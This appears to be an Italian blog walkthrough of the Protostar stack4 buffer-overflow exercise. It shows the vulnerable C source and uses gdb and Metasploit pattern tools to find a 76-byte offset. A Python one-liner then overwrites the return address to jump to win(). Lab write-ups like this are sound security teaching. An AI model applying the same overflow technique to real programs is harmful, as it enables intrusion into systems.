title:  Soluzione stack4 dei Protostar exploit exercises
date:   13-01-2020
slug:   protostar-stack4
category: security
summary: Proviamo a risolvere uno degli exploit exercises presenti nella VM [Protostar](https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/)

[Protostar](https://www.vulnhub.com/entry/exploit-exercises-protostar-v2,32/) è una Virtual Machine appositamente sviluppata per permettere di imparare a sfruttare diversi tipi di vulnerabilità.

In questo post andremo ad affrontare uno degli stack overflow, in particolare
la sfida stack4.

Il codice sorgente di questa sfida è:

```c
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  void win()
  {
    printf("code flow successfully changed\n");
  }

  int main(int argc, char **argv)
  {
    char buffer[64];

    gets(buffer);
  }
```

Troviamo il binario in `/opt/protostar/bin/stack4`.

L'uso di `gets(buffer)` rende evidente che il binario è vulnerabile ad un buffer overflow.
Mi creo quindi una stringa di overflow che mi permetta di ricavare l'offset sullo stack dell'indirizzo di ritorno.

Per farlo uso una VM con [Metasploit](https://www.metasploit.com/),
in particolare andremo ad usare lo script `pattern_create.rb` per generare una stringa di lunghezza 100 byte: `./pattern_create.rb -l 100`,
lo metto in un file prova, lo passo al programma tramite gdb

```
gdb
(gdb) run < /tmp/prova
```
Leggo l'indirizzo di segmentation fault

```
Program received signal SIGSEGV, Segmentation fault.
0x63413563 in ?? ()
```

A questo punto passo questo indirizzo alla VM metasploit, usando lo script `pattern_offset.rb` in modo da ottenere l'offset sullo stack dell'indirizzo di ritorno
`./pattern_offset.rb -q 63413563`

Otterrò che l'offset dell'indirizzo di ritorno è di 76 byte.
A questo punto vado a riempire tutto l'offset con delle 'A', poi metto l'indirizzo della funzione `win()` che voglio eseguire.

Trovo l'indirizzo della funzione `win` con `objdump`

```
objdump -d ./stack4 | grep win
080483f4 <win>:
```

Quindi so che dovrò passare questo indirizzo (cambiando l'ordine dei byte visto che siamo su x86 che è little endian) in questo modo:

```
python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./stack4
code flow successfully changed
```

voilà, abbiamo ottenuto il nostro risultato.
